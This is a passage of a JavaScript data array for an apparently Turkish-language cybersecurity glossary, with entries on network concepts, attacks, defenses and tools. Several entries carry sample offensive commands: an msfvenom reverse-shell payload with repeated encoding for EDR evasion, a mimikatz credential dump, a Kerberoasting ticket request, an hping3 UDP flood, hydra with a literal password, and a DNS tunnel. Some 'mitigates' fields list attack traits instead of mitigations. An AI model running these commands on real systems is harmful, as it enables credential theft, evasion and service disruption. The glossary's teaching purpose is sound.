            mitigates: "HttpOnly & Secure Cookie Bayrakları, Kısa Ömürlü JWT"
        },

        // --- AĞ & PROTOKOLLER (network) ---
        {
            tag: "HSTS",
            title: "HTTP Strict Transport Security (Zorunlu HTTPS)",
            category: "network",
            desc: "Tarayıcıya 'Bu web sitesine asla güvensiz HTTP ile bağlanma, her zaman zorunlu şifreli HTTPS (TLS 1.3) ile bağlan' talimatını veren güvenlik başlığıdır.",
            analogy: "Taksiye bindiğinizde şoföre 'Sadece zırhlı ve camları kurşun geçirmez arabayla giderim, normal arabaya asla binmem' demek gibidir.",
            mitigates: "SSL Strip, Man-in-the-Middle (Araya Girme) Saldırıları",
            cmd: "powershell .\\Audit-Headers.ps1"
        },
        {
            tag: "CSP",
            title: "Content Security Policy (İçerik Güvenliği Politikası)",
            category: "network",
            desc: "Tarayıcının sayfada hangi JavaScript kodlarını, resimleri ve fontları çalıştırabileceğini belirten katı beyaz listedir (whitelist).",
            analogy: "Şirket binasına girebilecek kuryelerin ve ziyaretçilerin önceden danışmaya isimlerinin bildirilmesi gibidir. İsmi listede olmayan içeri adım atamaz.",
            mitigates: "Cross-Site Scripting (XSS), Zararlı Kod Enjeksiyonu"
        },
        {
            tag: "PORT",
            title: "Ağ Portu (Network Port - 1-65535)",
            category: "network",
            desc: "Bilgisayar ağlarında çalışan her servis için ayrılmış mantıksal iletişim kapısıdır. Bir IP adresinde 65.535 port bulunur.",
            analogy: "Büyük bir plazadaki oda numaraları gibidir. Plaza adresi IP'dir, plazadaki Muhasebe odası 80, Yönetim odası 22, Güvenlik odası 443'tür.",
            mitigates: "Gereksiz Açık Portların Kapatılması Saldırı Yüzeyini Azaltır",
            cmd: "nmap -p- 127.0.0.1"
        },
        {
            tag: "IP-ADDRESS",
            title: "IP Adresi (Internet Protocol Address)",
            category: "network",
            desc: "İnternete bağlı her cihazın dünyadaki benzersiz dijital kimliğidir. 127.0.0.1 kendi makinemizi, 192.168.x.x yerel ağı temsil eder.",
            analogy: "Evinizin tapudaki açık sokak ve posta adresi gibidir. Kurye paketi teslim etmek için evin posta adresini bilmelidir.",
            mitigates: "IP Adresi Gizleme (VPN/Tor), IP Spoofing Kalkanları",
            cmd: "ip a"
        },
        {
            tag: "DNS",
            title: "Alan Adı Sistemi (Domain Name System)",
            category: "network",
            desc: "İnsanların aklında tutması kolay olan alan adlarını (örn: google.com) makinelerin anladığı IP adreslerine (142.250.x.x) çeviren telefon rehberidir.",
            analogy: "Akıllı telefonunuzdaki rehber gibidir. 'Ahmet' ismine basarsınız ama telefon arkada onun numarasını çevirir.",
            mitigates: "DNS Zehirleme (DNS Spoofing), DNSSEC Koruması",
            cmd: "nmap -sU -p 53 192.168.1.1"
        },
        {
            tag: "TCP-HANDSHAKE",
            title: "TCP 3 Yollu El Sıkışma (Three-Way Handshake)",
            category: "network",
            desc: "İki bilgisayar arasında veri aktarımı başlamadan önce yapılan 3 adımlı selamlama protokolüdür: SYN -> SYN-ACK -> ACK.",
            analogy: "Telefonda 'Alo sesimi alıyor musun?' (SYN), karşı tarafın 'Evet duyuyorum, sen beni duyuyor musun?' (SYN-ACK) ve sizin 'Tamam anlaştık konuşalım' (ACK) demenizdir.",
            mitigates: "Eksik Paket Tespiti, Bağlantı Doğrulama",
            cmd: "sudo hping3 -S -p 80 -c 1 192.168.1.1"
        },
        {
            tag: "VPN-TUNNEL",
            title: "Sanal Özel Ağ & Şifreli Tünel (VPN)",
            category: "network",
            desc: "Genel ve güvensiz internet ağları üzerinde iki uç nokta arasında tüm paketleri şifreleyerek görünmez bir koridor (tünel) oluşturan teknolojidir.",
            analogy: "Halka açık bir otoyolda giderken arabanızın etrafına görünmez ve kurşun geçirmez bir zırhlı tünel inşa etmek gibidir.",
            mitigates: "Halka Açık Wi-Fi Dinleme, Trafik Analizi",
            cmd: "ssh -D 1080 -q -C -N user@remote"
        },

        // --- SALDIRI TÜRLERİ (attacks) ---
        {
            tag: "SQLI",
            title: "SQL Injection (Veritabanı Kod Enjeksiyonu)",
            category: "attacks",
            desc: "Saldırganın web arama veya form alanlarına zararlı SQL veritabanı komutları yazarak tüm müşteri kayıtlarını ve şifreleri çalmasıdır. Entity Framework Core LINQ parametrik sorguları bu açığı tamamen engeller.",
            analogy: "Mektup atma kutusuna mektup yerine dinamit atmaktır. Parametrik koruma ise mektubu kutuya atmadan önce X-ray cihazından geçirip sadece kağıt olduğunu doğrulamaktır.",
            mitigates: "Tüm Veritabanının Çalınması, Veri Silinmesi",
            cmd: "sqlmap -u \"http://127.0.0.1/api/search?q=test\" --dbs"
        },
        {
            tag: "XSS",
            title: "Cross-Site Scripting (Siteler Arası Betik Çalıştırma)",
            category: "attacks",
            desc: "Web sitesindeki yorum veya girdi kutularına zararlı JavaScript kodu yerleştirerek, sayfayı ziyaret eden diğer masum kullanıcıların oturum çerezlerini çalma saldırısıdır.",
            analogy: "Mahallenin ortak duyuru panosuna ilan asmak yerine, panoya yaklaşan herkesin cebindeki cüzdanı çalan görünmez bir el yerleştirmektir.",
            mitigates: "HTML Encode, Katı Content-Security-Policy (CSP)"
        },
        {
            tag: "CLICKJACKING",
            title: "Clickjacking & UI Redressing (Tıklama Kaçırma)",
            category: "attacks",
            desc: "Saldırganın kendi sitesinde görünmez bir iframe açarak içine banka veya yönetim panelinizi gizlemesi ve size 'Tebrikler Ödül Kazandınız' butonuna bastırırken aslında arkadaki gizli butona tıklatmasıdır.",
            analogy: "Şeffaf bir kağıdın altına banka dekontunu koyup, size 'Anketi imzala' diyerek fark ettirmeden alttaki para transferi dekontunu imzalatmaktır.",
            mitigates: "X-Frame-Options: DENY, CSP frame-ancestors 'none'"
        },
        {
            tag: "DOS-DDOS",
            title: "Hizmet Engelleme Saldırısı (Denial of Service)",
            category: "attacks",
            desc: "Bir sunucuya saniyede kapasitesinin üzerinde milyonlarca yapay istek göndererek sistemin çökmesine ve gerçek kullanıcıların siteye girememesine yol açan saldırıdır.",
            analogy: "Bir kahve dükkanına aynı anda 10.000 kişinin hücum edip hiçbir şey almadan kasayı meşgul ederek gerçek müşterilerin içeri girmesini engellemesi gibidir.",
            mitigates: "Rate Limiting, Cloudflare WAF, SYN Cookies",
            cmd: "sudo hping3 --udp --flood -p 80 192.168.1.1"
        },
        {
            tag: "MITM",
            title: "Man-in-the-Middle (Ortadaki Adam Saldırısı)",
            category: "attacks",
            desc: "Saldırganın iki taraf (örneğin kurban ve banka sunucusu) arasına gizlice girerek tüm konuşmayı ve şifreleri dinlemesi veya değiştirmesidir.",
            analogy: "Postacı mektubunuzu postaneye götürürken yolda zarfı gizlice açıp içini okur, içine sahte mektup koyup zarfı tekrar yapıştırır.",
            mitigates: "Zorunlu Uçtan Uca HTTPS (TLS 1.3), HSTS Preload",
            cmd: "bettercap -iface lo"
        },
        {
            tag: "BRUTE-FORCE",
            title: "Kaba Kuvvet & Sözlük Parola Saldırısı",
            category: "attacks",
            desc: "Bir giriş ekranında binlerce veya milyonlarca yaygın parolayı sırayla deneyerek doğru şifreyi bulmaya çalışma yöntemidir.",
            analogy: "Bir asma kilidi açmak için elinizdeki binlerce anahtarı tek tek kilidin içine sokup çevirmeyi denemektir.",
            mitigates: "Hesap Kilitleme Politikası, Güçlü MFA, Fail2ban",
            cmd: "hydra -l admin -p Sebu132009 192.168.1.1 http-get /"
        },
        {
            tag: "PHISHING",
            title: "Oltalama & Sosyal Mühendislik (Phishing)",
            category: "attacks",
            desc: "Kullanıcıya güvenilir bir banka veya şirket gibi davranarak e-posta veya sahte web sitesi yoluyla şifrelerini ve kredi kartı bilgilerini kendi eliyle girmesini sağlama tuzağıdır.",
            analogy: "Kapınıza polis üniforması giyerek gelen bir hırsızın 'Güvenlik denetimi yapıyoruz, kasanızın şifresini verin' demesi ve sizin inanmanızdır.",
            mitigates: "Güvenlik Farkındalık Eğitimi, FIDO2 Donanım Anahtarı"
        },
        {
            tag: "ZERO-DAY",
            title: "Sıfır Gün Zafiyeti (Zero-Day Vulnerability)",
            category: "attacks",
            desc: "Yazılım üreticisinin henüz farkında olmadığı ve bu nedenle dünyada hiçbir güvenlik yaması veya güncellemesi bulunmayan tehlikeli güvenlik açığıdır.",
            analogy: "Kasa üreticisinin dahi bilmediği, fabrikadan çıkarken kasada unutulmuş gizli bir mekanik düğmenin hırsız tarafından keşfedilmesidir.",
            mitigates: "Zero-Trust Mimarisi, Derinlemesine Savunma (Defense-in-Depth)"
        },
        {
            tag: "RANSOMWARE",
            title: "Fidye Yazılımı (Ransomware)",
            category: "attacks",
            desc: "Sisteme sızarak tüm dosyaları ve veritabanlarını kırılamaz askeri şifrelerle (AES-256) şifreleyen ve dosyaları geri açmak için milyonlarca dolar fidye talep eden zararlı yazılımdır.",
            analogy: "Evinize girip tüm mobilya ve eşyalarınızı dev bir çelik kasaya kilitleyen ve 'Anahtar için bana para öde' diyen bir gaspçıdır.",
            mitigates: "Hava Boşluklu (Air-Gapped) Soğuk Yedekleme, EDR Koruması"
        },

        // --- SAVUNMA & ŞİFRELEME (defense) ---
        {
            tag: "NOSNIFF",
            title: "X-Content-Type-Options: nosniff (MIME Kalkanı)",
            category: "defense",
            desc: "Tarayıcının bir dosyanın türünü tahmin etmesini engeller. Sunucu bir dosyaya 'resim' dediyse, içinde gizli kod olsa bile tarayıcının onu kod olarak çalıştırmasını yasaklar.",
            analogy: "İlaç kutusunun üzerinde 'Aspirin' yazıyorsa, kutuyu açıp kokusuna bakarak 'bu şeker galiba' deyip yememek; kutudaki etikete sadık kalmaktır.",
            mitigates: "MIME Confuse ve Gizli Betik Çalıştırma Saldırıları"
        },
        {
            tag: "FIREWALL",
            title: "Durum Takipli Güvenlik Duvarı (Stateful Firewall / WAF)",
            category: "defense",
            desc: "Gelen ve giden tüm ağ paketlerini inceleyerek zararlı olanları engelleyen, yalnızca meşru trafiğe izin veren dijital güvenlik kalkanıdır.",
            analogy: "Havalimanı kapısındaki X-ray cihazı ve güvenlik görevlileridir. Yasaklı eşyaları valizinizden çıkarır, içeri sokmaz.",
            mitigates: "Port Taramaları, Yetkisiz Bağlantılar, Zararlı İstekler",
            cmd: "sudo ufw status verbose"
        },
        {
            tag: "EDR-SIEM",
            title: "Uç Nokta Tespiti & Olay Yönetimi (EDR / SIEM)",
            category: "defense",
            desc: "Şirketteki tüm bilgisayarları 7/24 izleyen, anormal bir dosya indirme veya şüpheli komut çalıştığında anında alarm üreten merkezi güvenlik merkezidir.",
            analogy: "Bir müzedeki binlerce güvenlik kamerasını tek bir odada canlı izleyen ve alarm çaldığında otomatik çelik kapıları kapatan güvenlik ekibidir.",
            mitigates: "Gelişmiş Kalıcı Tehditler (APT), Şüpheli Davranışlar"
        },
        {
            tag: "AIR-GAP",
            title: "Hava Boşluklu Yedekleme (Air-Gapped Backup)",
            category: "defense",
            desc: "Yedeklenen verilerin bulunduğu diskin internetten ve şirket ağından fiziksel olarak kablosu çekilerek tamamen izole bir kasada saklanmasıdır.",
            analogy: "Çok değerli altınlarınızı banka hesabında tutmak yerine yerin 50 metre altındaki çevrimdışı çelik kasada saklamaktır. Hiçbir hacker kablosu olmayan bir cihaza sızamaz.",
            mitigates: "Fidye Yazılımları (Ransomware), Ağ Sızıntıları"
        },
        {
            tag: "ZERO-TRUST",
            title: "Sıfır Güven Mimarisi (Zero-Trust Architecture)",
            category: "defense",
            desc: "'Asla güvenme, her zaman doğrula' felsefesidir. Şirket ağının içindeki çalışanlar da dahil olmak üzere her isteğin kimliği ve yetkisi her adımda yeniden doğrulanır.",
            analogy: "Çok gizli bir askeri üste, komutan olsanız bile geçtiğiniz her koridorda yeniden parmak izinizi ve retinanızı okutmanız gibidir.",
            mitigates: "İç Tehditler (Insider Threat), Ağ İçi Yatay Yayılma (Lateral Movement)"
        },
        {
            tag: "HONEYPOT",
            title: "Siber Bal Küpü (Honeypot - Tuzak Sistem)",
            category: "defense",
            desc: "Ağda bilerek zafiyetli gibi gösterilen sahte bir sunucu kurarak saldırganların ilgisini buraya çekmek ve onların yöntemlerini analiz etmek için kurulan tuzaktır.",
            analogy: "Bahçeye sahte bir mücevher kutusu koyup hırsızın oraya yönelmesini izlemek ve gerçek eve girmesini engellemektir.",
            mitigates: "Saldırgan Tespiti, Tehdit İstihbaratı Toplama"
        },

        // --- SİBER ARAÇLAR & PROTOKOLLER (tools) ---
        {
            tag: "NMAP",
            title: "Network Mapper (Ağ Haritalama Aracı)",
            category: "tools",
            desc: "Ağdaki cihazları, açık portları, çalışan servisleri ve işletim sistemlerini tespit etmek için tüm dünyada standart kabul edilen güvenlik aracıdır.",
            analogy: "Bir kalenin etrafında dolaşıp hangi kapıların açık, hangi pencerelerin kilitli olduğunu not alan keşif gözcüsüdür.",
            mitigates: "Bilinmeyen Açık Portların ve Eski Servislerin Keşfi",
            cmd: "nmap -p- 127.0.0.1"
        },
        {
            tag: "GOBUSTER",
            title: "Gobuster (Web Dizin & Gizli Rota Avcısı)",
            category: "tools",
            desc: "Go dilinde yazılmış ultra hızlı bir araçtır; web sitelerinde menülerde görünmeyen gizli admin panellerini ve yedek dosyalarını bulur.",
            analogy: "Büyük bir kütüphanede gizli bölmeleri ve kilitli odaları anahtar kelimelerle arayan araştırmacı dedektiftir.",
            mitigates: "Unutulan Yönetim Panelleri ve Yedek Dosyalarının Tespiti",
            cmd: "gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt"
        },
        {
            tag: "HPING3",
            title: "Hping3 (Özel TCP/IP Paket Sentezleyici)",
            category: "tools",
            desc: "İstediğiniz TCP, UDP veya ICMP bayraklarını elle ayarlayarak güvenlik duvarı kurallarını test edebileceğiniz esnek ağ aracıdır.",
            analogy: "Postacıya 'Bu mektubun üzerine sahte bir mühür vur ve kapıyı çalmadan kapının altından at' diyebildiğiniz özel kargo servisidir.",
            mitigates: "Güvenlik Duvarı Kural Doğrulama, DoS Dayanıklılık Testi",
            cmd: "sudo hping3 -S -p 80 -c 1 192.168.1.1"
        },
        {
            tag: "HYDRA",
            title: "THC-Hydra (Çok Kanallı Ağ Giriş Denetleyicisi)",
            category: "tools",
            desc: "SSH, FTP, HTTP ve RDP gibi 50'den fazla ağ protokolünde kaba kuvvet giriş denemesi yaparak zayıf parolaları denetleyen araçtır.",
            analogy: "Aynı anda 16 farklı anahtarı aynı kapının kilidinde deneyen çok kollu robot bir hırsız gibidir.",
            mitigates: "Zayıf veya Varsayılan Şifrelerin Tespit Edilip Güçlendirilmesi",
            cmd: "hydra -l admin -p Sebu132009 192.168.1.1 http-get /"
        },
        {
            tag: "SQLMAP",
            title: "Sqlmap (Otomatik Veritabanı Açık Denetçisi)",
            category: "tools",
            desc: "Web sitelerindeki SQL enjeksiyon açıklarını otomatik olarak tespit eden, veritabanı parmak izini çıkaran ve güvenliğini denetleyen araçtır.",
            analogy: "Binadaki duvarları özel bir cihazla tarayıp nerede gizli çatlak ve delik olduğunu bulan dedektördür.",
            mitigates: "Veritabanı Açıklarının Yama Öncesi Doğrulanması",
            cmd: "sqlmap -u \"http://127.0.0.1/api/search?q=test\" --dbs"
        },
        {
            tag: "BETTERCAP",
            title: "Bettercap (Ağ Analiz ve MITM Çerçevesi)",
            category: "tools",
            desc: "Yerel ağ trafiğini gerçek zamanlı izlemek, ARP zehirleme saldırılarını test etmek ve şifrelenmemiş protokolleri analiz etmek için kullanılır.",
            analogy: "Ağdaki tüm konuşmaları dinleyen hassas bir mikrofon ve santral yönlendiricisidir.",
            mitigates: "Ağ Şifreleme Eksikliklerinin ve ARP Zafiyetlerinin Tespiti",
            cmd: "bettercap -iface lo"
        },
        {
            tag: "CVE",
            title: "CVE (Common Vulnerabilities and Exposures)",
            category: "tools",
            desc: "Dünyada keşfedilen tüm siber güvenlik açıklarına verilen resmi, evrensel kimlik kodudur (örn: CVE-2021-44228 Log4j).",
            analogy: "Dünyadaki her hastalığa tıp literatüründe verilen uluslararası resmi teşhis kodu gibidir. Herkes aynı hastalıktan bahsettiğini anlar.",
            mitigates: "Evrensel Zafiyet Takibi ve Yama Yönetimi"
        }
    ,
{
                "tag": "EDR-BYPASS",
                "title": "EDR & Antivirus Bypass (Uç Nokta Kalkanını Atlama)",
                "category": "attacks",
                "desc": "Zararlı kodun statik imza taramalarını ve davranışsal EDR alarmlarını tetiklemeden belleğe enjekte edilmesi (Process Injection, Syscalls, Obfuscation) teknikleridir.",
                "analogy": "Bir casusun havalimanındaki X-Ray cihazına yakalanmamak için metal bıçak yerine seramik bıçak taşıması veya bekçiyi uyutacak sahte kimlik göstermesi gibidir.",
                "mitigates": "Statik İmza Taraması, API Hooking, Davranışsal EDR Analizi",
                "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/zutto_dekiru -i 5 -f exe"
        },
        {
                "tag": "C2-FRAMEWORK",
                "title": "C2 (Command & Control) Frameworks (Komuta Kontrol Sunucusu)",
                "category": "attacks",
                "desc": "Hedef bilgisayara sızdıktan sonra kurulan ve saldırganın kurbana uzaktan komut göndermesini sağlayan merkezi yönetim altyapısıdır (Cobalt Strike, Havoc, Mythic, Sliver).",
                "analogy": "Uzaktan kumandalı arabanın elinizdeki kumandasıdır. Araba (kurban) nereye giderse gitsin kumandadan gelen sinyallere göre yön alır.",
                "mitigates": "Düzenli Beacon Sinyalleri, DNS Tünelleme, Uzaktan Gizli Erişim",
                "cmd": "sliver-server"
        },
        {
                "tag": "KERBEROASTING",
                "title": "Kerberoasting (Active Directory Hizmet Hesabı Saldırısı)",
                "category": "attacks",
                "desc": "Active Directory ortamında SPN atanmış servis hesaplarının TGS (Ticket Granting Service) biletlerini talep edip çekerek kendi makinesinde parola hash'ini offline kırma saldırısıdır.",
                "analogy": "Bir kurumda çalışan personelin yemek fişlerini toplayıp eve götürmesi ve arkasındaki gizli damgayı evinde büyüteçle çözmeye çalışması gibidir.",
                "mitigates": "gMSA (Group Managed Service Accounts) Kullanımı, Güçlü 25+ Karakter Parolalar",
                "cmd": "GetUserSPNs.py corp.local/user:password -request -dc-ip 10.10.1.5"
        },
        {
                "tag": "BLOODHOUND",
                "title": "BloodHound & Cypher Graph (AD İlişki Haritalama)",
                "category": "tools",
                "desc": "Active Directory ağındaki tüm kullanıcılar, gruplar, bilgisayarlar ve ACL izinleri arasındaki gizli ve zafiyetli ilişkileri grafik teorisiyle haritalayan araçtır.",
                "analogy": "Bir labirentin tepeden çekilmiş dron fotoğrafıdır; en çaylak stajyer kullanıcısından en yetkili Domain Admin koltuğuna giden en kısa patikayı anında gösterir.",
                "mitigates": "Zafiyetli ACL Yetkilendirmeleri, Aşırı Domain Admin Dağıtımı",
                "cmd": "bloodhound-python -u user -p pass -d corp.local -c All"
        },
        {
                "tag": "MIMIKATZ",
                "title": "Mimikatz & LSASS Dump (RAM Bellekten Parola Avcılığı)",
                "category": "tools",
                "desc": "Windows işletim sisteminde oturum açmış kullanıcıların açık metin parolalarını, NTLM hash'lerini ve Kerberos biletlerini LSASS proses belleğinden çeken efsanevi araçtır.",
                "analogy": "Otel lobisindeki resepsiyonistin çekmecesine el çabukluğuyla uzanıp müşterilerin bıraktığı tüm oda anahtarlarını kopyalamak gibidir.",
                "mitigates": "LSA Protection (RunAsPPL), Credential Guard, Sysmon Event ID 10",
                "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
        },
        {
                "tag": "SNORT-SURICATA",
                "title": "Snort & Suricata (Ağ Tabanlı Tehdit Algılama - NIDS)",
                "category": "defense",
                "desc": "Ağ kablosundan geçen her baytı kural tabanlı imza motoruyla gerçek zamanlı tarayan, SQLi, port taraması veya zararlı C2 trafiği gördüğünde alarm üreten IDS/IPS sistemleridir.",
                "analogy": "Havalimanı girişindeki X-Ray cihazı ve metal dedektörüdür. Çantada silah veya patlayıcı gördüğü an siren çalar.",
                "mitigates": "Ağ İhlalleri, SYN Flood, Exploit Paketleri, Port Taraması",
                "cmd": "suricata -c /etc/suricata/suricata.yaml -i eth0"
        },
        {
                "tag": "YARA",
                "title": "YARA Kuralları (Zararlı Yazılım İmza & Örüntü Avcısı)",
                "category": "defense",
                "desc": "Zararlı yazılımların ve tehdit gruplarının kod bloklarını, metin dizgilerini ve ikili bayt kalıplarını metinsel kurallarla tanımlayıp uç noktalarda avlayan motordur.",
                "analogy": "Polisin elindeki 'Arananlar Robot Resmi' gibidir. Şüphelinin yüz hatları robottaki tarife uyuyorsa polis onu kalabalığın içinde anında yakalar.",
                "mitigates": "Zero-Day Zararlıları, Truva Atları, Dosyasız Zararlılar (Fileless)",
                "cmd": "yara -r rules.yar /var/www/uploads/"
        },
        {
                "tag": "VOLATILITY",
                "title": "Volatility Framework (RAM / Bellek Adli Bilişimi)",
                "category": "tools",
                "desc": "Çalışan bir sistemden alınan RAM bellek imajını (Memory Dump) ayrıştırarak çalışan gizli prosesleri, enjekte edilmiş DLL'leri ve açık ağ bağlantılarını ortaya çıkaran adli bilişim aracıdır.",
                "analogy": "Bir cinayet mahallinde zamanı dondurup o an odada nefes alan herkesin röntgenini çekmek gibidir. Bilgisayar kapandığında silinecek her şey RAM'dedir.",
                "mitigates": "Dosyasız Zararlı Tespiti, Rootkit Tespiti, Bellek İhlalleri",
                "cmd": "vol -f mem.dmp windows.pstree"
        },
        {
                "tag": "MITRE-ATTCK",
                "title": "MITRE ATT&CK & Cyber Kill Chain (Tehdit Matrisi)",
                "category": "defense",
                "desc": "Gerçek dünya saldırganlarının kullandığı taktik, teknik ve prosedürleri (TTP) doğrusal olmayan küresel bir matris şeklinde sınıflandıran endüstri standardı çerçevedir.",
                "analogy": "Bir futbol takımının rakip takımı analiz ettiği taktik tahtasıdır; rakibin kornerden mi, kontrataktan mı, yoksa kanattan mı saldırdığını madde madde gösterir.",
                "mitigates": "Savunma Boşlukları (Gap Analysis), Tehdit Tespiti Validasyonu"
        },
        {
                "tag": "ATOMIC-RED",
                "title": "Atomic Red Team & BAS (Birim Test Mantığıyla Güvenlik)",
                "category": "defense",
                "desc": "MITRE ATT&CK tekniklerini tek tek, kontrollü ve güvenli küçük birim testleri (Atomic Tests) şeklinde çalıştırarak EDR ve SIEM alarmlarının çalışıp çalışmadığını test eden araçtır.",
                "analogy": "Binadaki yangın alarmının düğmesine bilerek basıp sirenlerin çalıp çalmadığını ve itfaiyeye sinyal gidip gitmediğini test etmek gibidir.",
                "mitigates": "Sessiz Kalan Alarmlar, Yanlış Yapılandırılmış EDR Kuralları"
        },
        {
                "tag": "SIGMA",
                "title": "Sigma Kuralları (Evrensel SIEM / SOC Tespit Dili)",
                "category": "defense",
                "desc": "Splunk, QRadar, Microsoft Sentinel veya Elastic gibi farklı SIEM ürünlerine kolayca dönüştürülebilen, YAML tabanlı ortak siber tehdit kural formatıdır.",
                "analogy": "Dünya genelinde herkesin anladığı ortak İngilizce dili gibidir; bir kez yazarsınız, tüm yabancı sistemler kendi diline çevirip anında uygular.",
                "mitigates": "Üreticiye Bağımlı Kural Kilitlenmesi (Vendor Lock-in)"
        },
        {
                "tag": "STRIDE",
                "title": "STRIDE Tehdit Modellemesi (Tasarım Güvenliği)",
                "category": "defense",
                "desc": "Bir yazılım henüz kodlanmadan önce 6 kategori üzerinden (Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege) mimari zafiyetlerini öngörme metodolojisidir.",
                "analogy": "Bir binanın mimari çizimini incelerken 'Buraya deprem kolonu koymazsak bina çöker' diyerek inşaat başlamadan hatayı düzeltmektir.",
                "mitigates": "Tasarım Hataları, Mimari Güvenlik Açıkları"
        },
        {
                "tag": "REVERSE-SHELL",
                "title": "Reverse Shell vs Bind Shell (Tersine Kabuk Bağlantısı)",
                "category": "attacks",
                "desc": "Hedef bilgisayarın saldırgana bağlanmasını sağlayarak güvenlik duvarının (Firewall) gelen istekleri engelleme kuralını baypas eden saldırı yöntemidir.",
                "analogy": "Korumalı bir kalenin kapısını dışarıdan kırıp içeri giremiyorsanız, içerideki bir ajanın dışarıya telefon açıp kapıyı size açması gibidir.",
                "mitigates": "Egress (Giden Trafik) Filtreleme, Port Kısıtlamaları",
                "cmd": "nc -lvnp 4444"
        },
        {
                "tag": "SUID-PRIV",
                "title": "SUID Biti & Linux Yetki Yükseltme (Privilege Escalation)",
                "category": "attacks",
                "desc": "Linux sistemlerde bir ikili dosyaya `chmod u+s` verildiğinde, sıradan bir kullanıcı çalıştırsa bile dosya sahibinin (genellikle root) tam yetkisiyle ayağa kalkmasıdır.",
                "analogy": "Sıradan bir veznedarın eline genel müdür mühürlü bir belge verildiğinde o dakika boyunca genel müdür adına karar alabilmesi gibidir.",
                "mitigates": "Gereksiz SUID Bitlerinin Temizlenmesi, NoExec Bayrağı",
                "cmd": "find / -perm -u=s -type f 2>/dev/null"
        },
        {
                "tag": "DNS-TUNNEL",
                "title": "DNS Tünelleme (DNS Tunneling ile Veri Sızdırma)",
                "category": "attacks",
                "desc": "Tüm giden portların kapalı olduğu kurumsal ağlarda, yalnızca açık bırakılan 53 numaralı DNS portunu kullanarak verileri Base64 formatında dışarıya kaçırma tekniğidir.",
                "analogy": "Hapishanedeki mahkumun dışarıya mektup göndermesi yasakken, gardiyana sorduğu 'Bugün hava nasıl?' sorusunun içine gizli şifreli kelimeler ekleyerek dışarıya mesaj sızdırmasıdır.",
                "mitigates": "DNS Sinkholing, TXT Sorgu Boyutu Sınırlandırması",
                "cmd": "iodine -f -r 10.0.0.1 tunnel.corp.com"
        },
        {
                "tag": "KESTREL",
                "title": "Kestrel Web Server & Server Banner Redaction",
                "category": "defense",
                "desc": ".NET Core'un hafif ve yüksek performanslı web sunucusudur. HTTP yanıt başlıklarındaki `Server: Kestrel` imzasını silerek saldırganların sürüm açığı aramasını engeller.",
                "analogy": "Bir askerin üniformasından rütbe ve birlik armasını sökerek düşman keskin nişancısına kim olduğunu belli etmemesidir.",
                "mitigates": "Sunucu Sürüm Keşfi (Reconnaissance), Sürüme Özel Hedefli Exploitler"
        },
{
        "tag": "WAF",
        "title": "Web Application Firewall (Web Uygulama Güvenlik Duvarı)",
        "category": "defense",
        "desc": "Web uygulamasına gelen HTTP/HTTPS isteklerini uygulama katmanında (Layer 7) inceleyen; SQLi, XSS, CSRF gibi saldırıları sunucuya ulaşmadan önce engelleyen kalkandır.",
        "analogy": "Havalimanı kapısındaki x-ray ve bagaj tarama cihazıdır. İçeriye girmek isteyen her yolcunun çantasını açıp yasaklı sıvı veya kesici alet arar.",
        "mitigates": "OWASP Top 10 Zafiyetleri, SQL Injection, Cross-Site Scripting, HTTP Flood",
        "cmd": "modsecurity -t /etc/nginx/modsec/main.conf"
},
        {
        "tag": "SIEM",
        "title": "Security Information & Event Management (Merkezi Log ve Olay Yönetimi)",
        "category": "defense",
        "desc": "Tüm güvenlik duvarları, sunucular, veritabanları ve uç noktalardan gelen milyonlarca logu tek merkezde toplayıp korelasyon kurarak şüpheli olayları alarmlaştıran beyindir.",
        "analogy": "Koca bir şehrin tüm MOBESE kameralarını, trafik ışıklarını ve yangın sensörlerini tek bir odada toplayıp şüpheli bir aracı anında takip eden afet koordinasyon merkezidir.",
        "mitigates": "Log Dağınıklığı, Kör Noktalar, Geç Tehdit Tespiti"
},
        {
        "tag": "SOAR",
        "title": "Security Orchestration, Automation & Response (Siber Güvenlik Otomasyonu)",
        "category": "defense",
        "desc": "SIEM'in ürettiği alarmları insan müdahalesi beklemeden önceden tanımlı senaryolarla (Playbook) saniyeler içinde otomatik çözüme ulaştıran (IP engelleme, hesabı kilitleme) orkestrasyondur.",
        "analogy": "Evde duman kokusu alındığında insanın düğmeye basmasını beklemeden yangın vanalarını açıp itfaiyeyi otomatik arayan akıllı yangın söndürme sistemidir.",
        "mitigates": "Analist Alarm Yorgunluğu (Alert Fatigue), Yavaş Olay Müdahale Süreleri"
},
        {
        "tag": "DLP",
        "title": "Data Loss Prevention (Veri Sızıntısı ve Kaybı Önleme)",
        "category": "defense",
        "desc": "Kurum içindeki kredi kartı numaraları, TC kimlikleri veya gizli şirket belgelerinin e-posta, USB bellek veya bulut yüklemeleriyle dışarı kaçırılmasını engelleyen güvenlik çözümüdür.",
        "analogy": "Bir fabrikanın çıkışındaki güvenlik dedektörünün personelin çantasındaki şirket malını algılayıp kapıları kilitlemesi gibidir.",
        "mitigates": "İç Tehditler (Insider Threat), Veri Sızıntıları, KVKK / GDPR İhlalleri"
},
        {
        "tag": "XDR",
        "title": "Extended Detection & Response (Genişletilmiş Tehdit Avı)",
        "category": "defense",
        "desc": "Yalnızca bilgisayarları değil; ağ trafiğini, bulut hesaplarını ve e-postaları tek bir yapay zeka motoruyla birleştirerek sofistike saldırı zincirlerini uçtan uca yakalayan sistemdir.",
        "analogy": "Hem binanın içindeki kameraları, hem dış kapıdaki nöbetçiyi, hem de helikopter pistini aynı anda dinleyip şüpheliyi her noktada takip eden koruma ordusudur.",
        "mitigates": "Gelişmiş Kalıcı Tehditler (APT), Çok Kanallı Saldırılar"
},
        {
        "tag": "WATERING-HOLE",
        "title": "Watering Hole Saldırısı (Su Kaynağı Pusu Tekniği)",
        "category": "attacks",
        "desc": "Hedef şirkete doğrudan saldırmak yerine, şirket çalışanlarının sık sık ziyaret ettiği güvenilir sektörel bir web sitesini (örneğin mühendislik forumu) ele geçirip oraya zararlı kod yerleştirme taktiğidir.",
        "analogy": "Aslanın ceylanları tek tek kovalamak yerine, tüm ceylanların her akşam su içtiği nehir kenarındaki gölette pusuya yatması gibidir.",
        "mitigates": "Web Filtreleme, Tarayıcı İzolasyonu (RBI), Güncel Sandbox Taramaları"
},
        {
        "tag": "ARP-SPOOF",
        "title": "ARP Poisoning / Spoofing (Yerel Ağ Sahteciliği)",
        "category": "network",
